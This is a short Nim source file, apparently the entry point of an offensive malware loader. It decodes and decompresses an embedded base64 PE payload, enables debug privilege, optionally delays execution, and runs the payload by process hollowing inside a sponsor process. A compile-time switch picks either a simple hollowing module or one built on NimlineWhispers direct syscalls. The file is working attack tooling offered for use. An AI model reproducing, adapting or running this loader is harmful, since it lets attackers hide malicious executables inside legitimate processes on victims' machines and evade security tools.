# Internal
import utils
import params
# External
import os
import winim/inc/windef
from std/base64 import decode
from zip/zlib import uncompress

# Import per module chosen
when defined(hollowsimple):
    import hollowsimple
when defined(hollownimline):
    import hollowNimlineWhispers


proc execute*(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), sleepSeconds: int = 0): bool =

    # Sleep at execution
    sleep(sleepSeconds * 1000)

    # Decode and decompress PE
    var compressedPe = decode(compressedBase64PE)
    var peStr = uncompress(compressedPe)

    # Enable debug privilege
    discard setDebugPrivilege()
    
    # Execute module
    when defined(hollowsimple):
        return simpleHollow(peStr, cast[LPCSTR](unsafeAddr sponsorCmd[0]))
    when defined(hollownimline):
        return nimlineHollow(peStr, cast[LPCSTR](unsafeAddr sponsorCmd[0]))

# Execute
discard execute(
    compressedBase64PE = compressedBase64PE, 
    sponsorCmd = sponsorPath & " " & sponsorParams,
    sleepSeconds = sleepSeconds
)

